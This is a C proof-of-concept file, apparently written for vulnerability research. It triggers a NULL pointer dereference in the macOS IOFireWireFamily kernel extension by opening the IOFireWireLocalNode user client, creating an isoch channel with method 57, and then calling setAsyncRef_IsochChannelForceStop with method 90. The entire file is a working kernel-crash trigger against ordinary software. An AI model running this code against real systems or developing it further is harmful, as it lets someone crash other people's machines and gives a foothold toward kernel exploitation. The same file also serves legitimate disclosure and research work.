/*
 * IOFireWireFamily-null-deref.c
 * Brandon Azad
 *
 * NULL pointer dereference in IOFireWireUserClient::setAsyncRef_IsochChannelForceStop.
 */

#include <IOKit/IOKitLib.h>

int main() {
	int ret = 0;
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
			IOServiceMatching("IOFireWireLocalNode"));
	if (service == IO_OBJECT_NULL) {
		ret = 1;
		goto fail1;
	}
	io_connect_t connect;
	kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
	IOObjectRelease(service);
	if (kr != KERN_SUCCESS) {
		ret = 2;
		goto fail1;
	}
	// isochChannel_Create
	uint64_t args[3] = { 0, 0x100, 0x100 };
	uint64_t handle = 0;
	uint32_t output_count = 1;
	kr = IOConnectCallMethod(connect, 57,
			args, sizeof(args) / sizeof(*args), NULL, 0,
			&handle, &output_count, NULL, NULL);
	if (kr != KERN_SUCCESS) {
		ret = 3;
		goto fail2;
	}
	// setAsyncRef_IsochChannelForceStop
	kr = IOConnectCallMethod(connect, 90,
			&handle, 1, NULL, 0,
			NULL, NULL, NULL, NULL);
	if (kr != KERN_SUCCESS) {
		ret = 4;
		goto fail2;
	}
fail2:
	IOServiceClose(connect);
fail1:
	return ret;
}
